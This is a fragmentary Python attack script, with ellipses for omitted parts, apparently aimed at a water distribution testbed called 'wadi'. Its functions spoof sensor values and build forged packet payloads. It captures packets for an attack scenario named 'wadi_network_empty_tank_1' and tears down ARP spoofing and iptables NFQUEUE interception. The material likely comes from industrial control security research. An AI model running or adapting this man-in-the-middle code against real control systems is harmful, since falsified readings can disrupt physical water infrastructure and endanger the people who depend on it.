...
def spoof_value(raw):
    ...
    c.execute("UPDATE wadi SET value = 3 WHERE name = 'ATT_1'")
    conn.commit()
    pay = translate_float_to_load(fake_value, raw[0], raw[1])
    return pay
...
def capture(packet):
    ...
    if len(pkt) == 102:
        ...
        if sys.argv[3] == "wadi_network_empty_tank_1":
...
def __setdown(port):
    restore_arp()
    cmd = 'iptables -t mangle -D PREROUTING -p tcp --sport ' + str(port) + ' -j NFQUEUE'
    os.system(cmd)
